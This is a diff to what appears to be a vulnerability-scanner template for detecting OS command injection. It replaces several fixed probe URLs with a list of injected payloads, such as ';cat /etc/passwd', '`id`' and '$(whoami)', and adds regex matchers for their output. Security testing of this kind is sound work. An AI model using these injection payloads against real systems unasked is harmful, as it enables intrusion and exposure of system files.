@@ -8,47 +8,23 @@ info:
     cwe: "CWE-78"
 requests:
   - method: GET
-    path: "/ping?host=127.0.0.1;id"
+    path: "/"
+    attack: inject
+    inject_in: query
+    payloads:
+      - ";cat /etc/passwd"
+      - "& type C:\\Windows\\win.ini"
+      - "`id`"
+      - "$(whoami)"
     matchers:
       - type: regex
         part: body
         regex:
-          - "uid=[0-9]+\\(\\w+\\)"
-          - "gid=[0-9]+\\(\\w+\\)"
-          - "groups="
+          - "root:x:0:0"
+          - "\\[fonts\\]"
+          - "uid=[0-9]+\\(.*?\\)"
       - type: status
         part: status
         status:
           - 200
     matcher_condition: and
-
-  - method: GET
-    path: "/exec?cmd=cat%20/etc/passwd"
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
-          - "bin:.*:1:1:"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: and
-
-  - method: GET
-    path: "/diagnostic?ip=|whoami"
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root"
-          - "admin"
-          - "www-data"
-          - "nt authority\\system"
-          - "vagrant"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: or
